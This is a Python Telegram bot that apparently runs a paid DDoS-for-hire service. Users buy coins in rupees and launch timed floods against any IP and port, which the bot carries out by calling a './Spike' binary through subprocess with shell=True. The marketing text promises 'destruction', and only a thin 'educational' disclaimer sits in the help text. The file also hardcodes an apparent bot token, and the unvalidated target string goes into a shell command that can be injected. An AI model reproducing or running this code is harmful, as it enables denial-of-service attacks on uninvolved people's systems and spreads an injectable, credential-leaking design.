import os
import telebot
import subprocess
import datetime
import threading
import json
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from telebot import types

bot = telebot.TeleBot('8789796877:AAHGLujUu6i7lKrdfQrFHsLto9mFiBNTt_I')

# Admin user IDs
admin_id = ["974086780"]

# File to store user data
USER_DATA_FILE = "users_data.json"
LOG_FILE = "log.txt"

# Track ongoing attack
ongoing_attack = None
attack_lock = threading.Lock()

# Load user data
def load_user_data():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as file:
            return json.load(file)
    return {}

# Save user data
def save_user_data(data):
    with open(USER_DATA_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Duration: {time} sec"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")
        
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    
    button1 = types.InlineKeyboardButton(
        text="🚀 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🚀", 
        url="https://t.me/DANGER_BOY_OP1"
    )
    
    button2 = types.InlineKeyboardButton(
        text="👑 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👑", 
        url="https://t.me/DANGER_BOY_OP"
    )
    
    # Add buttons in a structured layout
    markup.add(button1)
    markup.add(button2)

    return markup

# Check remaining attack time
@bot.message_handler(commands=['when'])
def check_remaining_time(message):
    global ongoing_attack
    if ongoing_attack:
        remaining = (ongoing_attack['start_time'] + datetime.timedelta(seconds=ongoing_attack['duration'])) - datetime.datetime.now()
        if remaining.total_seconds() > 0:
            bot.send_message(message.chat.id, f"⚠️ *An attack is already in progress!* ⚠️\n"
                f"🕒 *Time Left : {int(remaining.total_seconds())}sec*\n"
                f"⏳ *Please wait until the current attack is completed before starting a new one.*",reply_markup=create_inline_keyboard(), 
                parse_mode="Markdown")
        else:
            ongoing_attack = None
            bot.send_message(message.chat.id, "✅ *No active attack!* ✅\n"
                "🚀 *You are free to launch a new attack now!*",reply_markup=create_inline_keyboard(), 
                parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "🚀 *No attack is currently running!* 🚀\n"
            "🔄 *Use /attack to start a new one.*",reply_markup=create_inline_keyboard(), 
            parse_mode="Markdown")

# Function to start an attack
def process_attack(message, target, port, time):
    global ongoing_attack

    user_id = str(message.chat.id)
    user_data = load_user_data()

    # Deduct 5 coins
    user_data[user_id]['coins'] -= 5
    save_user_data(user_data)

    # Record the command
    record_command_logs(user_id, '/attack', target, port, time)

    # Send attack started message
    bot.send_message(message.chat.id, f"⚔️ *Attack Launched!* ⚔️\n"
        f"🎯 *Target : {target}*\n"
        f"🔹 *Port: {port}*\n"
        f"⏳ *Duration : {time}sec*\n"
        f"🔥 *Brace yourself! The battlefield is set, and the chaos begins!*",reply_markup=create_inline_keyboard(), 
        parse_mode="Markdown")

    # Execute the attack
    full_command = f"./Spike {target} {port} {time} 200"
    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.send_message(message.chat.id, f"❌ *Attack Failed!* ❌\n"
            f"🛠️ *Possible Issues:*\n"
            f"*Binary file is missing or not executable.*\n"
            f"*Incorrect file permissions.*\n"
            f"*Dependencies not installed.*\n\n", reply_markup=create_inline_keyboard(), 
            parse_mode="Markdown")
        return

    # Attack completed
    bot.send_message(message.chat.id, "✅ *Attack Completed!* ✅\n"
    "⚔️ *The battlefield has cleared!*\n"
    "🔥 *Enemies defeated, the digital warzone is yours!* \n"
    "💀 *Victory tastes sweet, but the next battle awaits...*",reply_markup=create_inline_keyboard(), 
    parse_mode="Markdown")

    # Reset attack status
    with attack_lock:
        ongoing_attack = None

# Attack command handler
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    global ongoing_attack

    user_id = str(message.chat.id)
    user_data = load_user_data()
    user_coins = user_data.get(user_id, {}).get('coins', 0)  # Get user's coin balance

    # Check if user has exactly 5 coins
    if user_data.get(user_id, {}).get('coins', 0) < 5:
        bot.send_message(
            message.chat.id,
            "🚫 *Access Denied!* 🚫\n"
            "💰 *You need exactly 5 coins to launch an attack.*\n"
            f"💳 *Your balance : {user_coins}Coins*\n"
            "⚡ *Add coins and try again!*",reply_markup=create_inline_keyboard(), 
            parse_mode="Markdown"
        )
        return

    # Check if an attack is already in progress
    with attack_lock:
        if ongoing_attack:
            bot.send_message(
                message.chat.id,
                "⚠️ *An attack is already in progress!* ⚠️\n"
                "💣 *Use /when to check remaining time.*\n"
                "⏳ *Patience, warrior! Your turn will come soon!* 🔥",reply_markup=create_inline_keyboard(), 
                parse_mode="Markdown"
            )
            return

    bot.send_message(
        message.chat.id,
        "🎯 *Target Selection Initiated!* 🎯\n"
        "🚀 *Enter the target details in the format:* \n"
        "```\n<IP> <PORT> <DURATION>\n```"
        "⏳ *Example:* `192.168.1.1 80 120`\n"
        "💀 *Maximum duration allowed: 800 seconds!*",reply_markup=create_inline_keyboard(), 
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, process_attack_input)


def process_attack_input(message):
    global ongoing_attack

    user_id = str(message.chat.id)
    command = message.text.split()

    if len(command) == 3:
        target = command[0]
        try:
            port = int(command[1])
            duration = int(command[2])
        except ValueError:
            bot.send_message(message.chat.id, "❌ *Invalid Input Format!* ❌\n"
            "📌 *Use the correct format:* `<IP> <PORT> <DURATION>`\n"
            "💡 *Example:* `192.168.1.1 443 200`\n"
            "⚠️ *Duration must be a number (Max: 800s)*",reply_markup=create_inline_keyboard(), 
            parse_mode="Markdown")
            return

        if duration > 800:
            bot.send_message(message.chat.id, "⏳ *Hold your fire!* ⏳\n"
            "⚠️ *Maximum attack duration allowed is 800 seconds.*\n"
            "💡 *Try again with a shorter duration!*",reply_markup=create_inline_keyboard(), 
            parse_mode="Markdown")
            return

        with attack_lock:
            if ongoing_attack:
                bot.send_message(message.chat.id, "⚠️ *An attack is already in progress!* ⚠️\n"
                "🔥 *Check status using /when before launching another attack!*",reply_markup=create_inline_keyboard(), 
                parse_mode="Markdown")
                return
            ongoing_attack = {
                "start_time": datetime.datetime.now(),
                "duration": duration
            }

        # Start attack in a separate thread
        attack_thread = threading.Thread(target=process_attack, args=(message, target, port, duration))
        attack_thread.start()
    else:
        bot.send_message(message.chat.id, "❌ *Invalid Input Format!* ❌\n"
            "📌 *Use the correct format:* `<IP> <PORT> <DURATION>`\n"
            "💡 *Example:* `192.168.1.1 443 200`\n"
            "⚠️ *Duration must be a number (Max: 800s)*",reply_markup=create_inline_keyboard(), 
            parse_mode="Markdown"
        )


@bot.message_handler(commands=['coins'])
def handle_buy_coins(message):
    price_list = (
        "🔥 *COINS = MORE MATCHES = MORE WINS!* 🏆\n"
        "💵 *₹100* → 🪙 *125 COINS*\n"
        "💵 *₹300* → 🪙 *355 COINS*\n"
        "💵 *₹500* → 🪙 *625 COINS*\n"
        "💵 *₹700* → 🪙 *865 COINS*\n"
        "💵 *₹1000* → 🪙 *1255 COINS*\n"
        "💵 *₹1500* → 🪙 *2000 COINS*\n"
        "💵 *₹2000* → 🪙 *3000 COINS*\n"
        "🚀 *Instant Top-Up Available!*\n"
        "💬 *Need Help? Contact the Owner ⬇️*"
    )
    bot.send_message(message.chat.id, price_list, parse_mode="Markdown", reply_markup=create_inline_keyboard(), disable_web_page_preview=True)


# Function to initialize the user data when the bot starts
@bot.message_handler(commands=['register'])
def initialize_user_data(message):
    user_data = load_user_data()
    user_id = str(message.chat.id)

    if user_id not in user_data:
        user_data[user_id] = {"coins": 0, "registered_on": str(datetime.datetime.now())}
        save_user_data(user_data)

        bot.send_message(
            message.chat.id,  
            "🎉 *Welcome to the Coin System!* 🎉\n"
            "✅ *Account Registered!*\n"
            "💰 *Balance:* `0` Coins 🪙\n"
            f"🕐 *Registered On:* `{user_data[user_id]['registered_on']}`\n"
            "💲 *Need Coins?*\n"
            "🔥 *Use /coins to buy instantly!*\n\n",
            parse_mode="Markdown",reply_markup=create_inline_keyboard(), 
            disable_web_page_preview=True
        )
    else:
        bot.send_message(
            message.chat.id,  
            "⚠️ *Already Registered!*\n"
            "✅ *Account Verified!*\n"
            "💰 *Check Balance: /info*\n"
            "💲 *Need Coins?*\n"
            "*Use /coins to buy now!*\n",
            parse_mode="Markdown",reply_markup=create_inline_keyboard(), 
            disable_web_page_preview=True
        )

@bot.message_handler(commands=['info'])
def handle_info_button_press(message):
    user_id = str(message.chat.id)
    user_data = load_user_data()

    if user_id not in user_data:
        # Initialize user if they don't exist
        user_data[user_id] = {"coins": 0, "registered_on": str(datetime.datetime.now())}
        save_user_data(user_data)

    # Get user info
    username = message.from_user.username if message.from_user.username else "N/A"
    user_status = "Admin👑" if user_id in admin_id else "RegularUser👤"
    coins = user_data[user_id]['coins']

    # Format the info message
    user_info = (
      f"📜 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 📜\n"
      f"🔍 𝗨𝘀𝗲𝗿 𝗣𝗿𝗼𝗳𝗶𝗹𝗲:\n"
      f"💼 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗦𝘁𝗮𝘁𝘂𝘀: {user_status}\n"
      f"🔑 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
      f"🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}\n"
      f"💰 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {coins}𝗖𝗼𝗶𝗻𝘀\n"
    )

    # Send the user info message
    bot.send_message(message.chat.id, user_info, reply_markup=create_inline_keyboard())


@bot.message_handler(commands=['approve'])
def approve_coins(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.send_message(message.chat.id,  
            "🚫 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱\n"
            "🔒 𝗬𝗼𝘂 𝗱𝗼 𝗻𝗼𝘁 𝗵𝗮𝘃𝗲 𝗮𝗱𝗺𝗶𝗻 𝗿𝗶𝗴𝗵𝘁𝘀 𝘁𝗼 𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n"
            "🛠 𝗢𝗻𝗹𝘆 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝗮𝗽𝗽𝗿𝗼𝘃𝗲 𝗰𝗼𝗶𝗻𝘀 𝗳𝗼𝗿 𝘂𝘀𝗲𝗿𝘀",reply_markup=create_inline_keyboard())
        return

    data = message.text.split()
    if len(data) != 3:
        bot.send_message(message.chat.id,  
            "⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗨𝘀𝗮𝗴𝗲\n"
            "🔹 𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝗙𝗼𝗿𝗺𝗮𝘁  𝗮𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝗜𝗗 𝗖𝗼𝗶𝗻𝘀\n"
            "🔹 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 '/approve 123456789 50'\n"
            "📌 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗮𝗹𝗹𝗼𝘄𝘀 𝗮𝗱𝗺𝗶𝗻𝘀 𝘁𝗼 𝗮𝗱𝗱 𝗰𝗼𝗶𝗻𝘀 𝘁𝗼 𝗮 𝘂𝘀𝗲𝗿𝘀 𝗮𝗰𝗰𝗼𝘂𝗻𝘁",reply_markup=create_inline_keyboard())
        return

    target_user = data[1]
    try:
        coins = int(data[2])
    except ValueError:
        bot.send_message(message.chat.id,  
            "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗡𝘂𝗺𝗯𝗲𝗿\n"
            "🔢 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗶𝗻 𝗮𝗺𝗼𝘂𝗻𝘁\n"
            "📌 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 '/approve 123456789 50'",reply_markup=create_inline_keyboard())
        return

    user_data = load_user_data()

    if target_user not in user_data:
        bot.send_message(message.chat.id,  
            f"🚫 𝗨𝘀𝗲𝗿 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱\n"
            f"🆔 𝗘𝗻𝘁𝗲𝗿𝗲𝗱 𝗨𝘀𝗲𝗿 𝗜𝗗  {target_user}\n"
            "❌ 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱\n"
            "📌 𝗩𝗲𝗿𝗶𝗳𝘆 𝘁𝗵𝗲 𝗨𝘀𝗲𝗿 𝗜𝗗 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻",reply_markup=create_inline_keyboard())
        return

    # Add coins to the user
    user_data[target_user]['coins'] += coins
    save_user_data(user_data)

    bot.send_message(message.chat.id,  
        f"✅ 𝗖𝗼𝗶𝗻𝘀 𝗔𝗱𝗱𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n"
        f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗  {target_user}\n"
        f"💰 𝗖𝗼𝗶𝗻𝘀 𝗔𝗱𝗱𝗲𝗱  {coins}\n"
        f"💳 𝗨𝗽𝗱𝗮𝘁𝗲𝗱 𝗕𝗮𝗹𝗮𝗻𝗰𝗲  {user_data[target_user]['coins']} 🏆\n"
        "🎮 𝗘𝗻𝗷𝗼𝘆 𝗬𝗼𝘂𝗿 𝗚𝗮𝗺𝗲𝘀\n"
        "🔥 𝗞𝗲𝗲𝗽 𝗣𝗹𝗮𝘆𝗶𝗻𝗴 𝗮𝗻𝗱 𝗗𝗼𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴",reply_markup=create_inline_keyboard())


@bot.message_handler(commands=['start'])
def handle_start(message):
  welcome_msg = (
    "🔥 *WELCOME TO DDOS BOT* 🔥\n"
    "🚀 *Unleash Digital Chaos with Powerful Features:* \n\n"
    "✅ *Blazing-fast attack execution – No delays, just destruction!*\n"
    "✅ *Real-time balance & account insights – Stay in control!* 📊\n"
    "✅ *Instant coin purchases – Extend your firepower anytime!* 💰\n"
    "✅ *Secure & anonymous – Your actions remain private!* 🛡️\n"
    "✅ *No limits on power – Strike when needed, without restrictions!* ⚔️\n\n"
    "📌 *How to Command the Battlefield:* \n"
    "🔹 */register – Register Your Account Now* 👤\n"
    "🔹 */attack <ip> <port> <time> – Launch a strike with precision!* ⚡\n"
    "🔹 */info – Check your warrior stats, balance & history!* 🆔\n"
    "🔹 */coins – Stock up on coins & dominate longer battles!* 🏆\n"
    "🔹 */when – Monitor active attack duration in real-time!* ⏳\n"
  )

  bot.send_message(message.chat.id, welcome_msg, parse_mode="Markdown", reply_markup=create_inline_keyboard())



@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)

    # Check if the user is an admin
    if user_id not in admin_id:
        bot.send_message(
            message.chat.id, 
            "🚫 *Access Denied!*\n"
            "🔒 *You do not have permission to access the logs.*\n"
            "*This action is restricted to bot administrators only.*\n"
            "📌 *If you believe this is an error, contact support.*",
            parse_mode="Markdown", reply_markup=create_inline_keyboard())
        return

    # Check if the log file exists
    if not os.path.exists(LOG_FILE):
        bot.send_message(
            message.chat.id, 
            "❌ *Log File Not Found!*\n\n"
            "📂 *There are currently *no logs available*.\n"
            "*This could mean:*\n"
            "➤ *The bot has not recorded any activity yet.*\n"
            "➤ *The logs have been cleared or deleted.*\n\n"
            "🔄 *Try again later or ensure logging is enabled.*",
            parse_mode="Markdown", reply_markup=create_inline_keyboard()
        )
        return

    try:
        # Open and send the log file
        with open(LOG_FILE, "rb") as log_file:
            bot.send_document(
                message.chat.id, 
                log_file, 
                caption="📄 *Here are the latest bot logs!*\n\n"
                        "📜 *Review them carefully to monitor bot activities.*\n"
                        "⚠️ *Sensitive information may be present.*",reply_markup=create_inline_keyboard(), 
                parse_mode="Markdown"
            )
    except Exception as e:
        # Handle any file access errors
        bot.send_message(
            message.chat.id, 
            f"❌ *Error Accessing Logs!*\n\n"
            f"⚠️ *An unexpected error occurred while retrieving the logs.*\n"
            f"📌 *Error Details:* `{str(e)}`\n\n"
            f"🔄 *Try again later or check if the log file is accessible.*",reply_markup=create_inline_keyboard(), 
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['help'])
def handle_help(message):
    help_msg = (
        "📜 *HELP MENU* 📜\n\n"
        "🔥 *Welcome to DDOS BOT!* 🔥\n\n"
        "💣 *Commands & Features:*\n"
        "🔹 */attack <IP> <PORT> <TIME> - Launch a digital strike ⚡ (Cost: 5 Coins)*\n"
        "🔹 */when - Check if an attack is running & time left*⏳\n"
        "🔹 */info - View your account details* 🆔\n"
        "🔹 */coins` - Buy more coins* 💰\n\n"
        "💰 *Pricing & System:*\n"
        "🔹 *Each attack costs : 5 Coins* 🪙\n"
        "🔹 *Purchase Coins : /coins*\n\n"
        "⚠️ *Note : Attacks are for educational & stress-testing purposes only. Unauthorized use is illegal! ⚖️*\n\n"
        "💬 *Need Help? Contact the Owner ⬇️*"
    )

    bot.send_message(message.chat.id, help_msg, parse_mode="Markdown", reply_markup=create_inline_keyboard())

# Start polling
bot.polling(none_stop=True)
